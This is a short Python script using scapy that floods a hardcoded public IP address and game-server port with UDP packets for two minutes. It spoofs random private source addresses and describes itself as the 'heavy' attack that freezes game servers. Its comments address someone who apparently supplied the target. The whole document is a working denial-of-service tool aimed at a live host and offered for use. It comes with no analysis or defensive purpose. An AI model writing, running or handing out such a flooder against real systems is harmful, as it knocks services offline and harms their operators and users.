import os
import sys
import time
import random
import threading
from scapy.all import IP, UDP, send, conf

# CONFIGURATION
TARGET_IP = "20.235.148.44"  # Wo IP jo tumne diya
TARGET_PORT = 25431          # Wo Port jo tumne diya
DURATION = 120               # Duration in seconds
PACKETS_PER_SEC = 1000       # Packets per second (Increase this for more power)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def udp_flood():
    """
    Sends UDP packets to the target IP and Port.
    This is the 'heavy' attack that freezes game servers.
    """
    global running
    start_time = time.time()
    packets_sent = 0
    
    # Create the packet payload
    # Random source port to avoid firewall filtering
    src_port = random.randint(1024, 65535)
    
    while time.time() - start_time < DURATION:
        if not running:
            break
            
        try:
            # Create UDP packet
            pkt = IP(dst=TARGET_IP, src=f"192.168.{random.randint(1,255)}.{random.randint(1,255)}") / \
                   UDP(sport=src_port, dport=TARGET_PORT) / \
                   b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09" # Dummy payload
            
            # Send packet asynchronously (don't wait for response)
            send(pkt, verbose=False)
            packets_sent += 1
            
            # Control rate
            time.sleep(1.0 / PACKETS_PER_SEC)
            
        except Exception as e:
            # If rate is too high, OS might drop packets, just continue
            pass

    print(f"\n[+] Attack Finished.")
    print(f"[+] Total Packets Sent: {packets_sent}")

def stop_attack():
    global running
    running = False
    print("\n[-] Attack Stopped.")

if __name__ == "__main__":
    running = True
    clear_screen()
    print(f"🚀 TARGET: {TARGET_IP}:{TARGET_PORT}")
    print(f"⏳ DURATION: {DURATION} Seconds")
    print(f"📦 PACKETS/SEC: {PACKETS_PER_SEC}")
    print("-" * 40)
    print("Attacking... (Do not close this window)")
    print("Press Ctrl+C to stop early.")
    
    try:
        udp_flood()
    except KeyboardInterrupt:
        stop_attack()
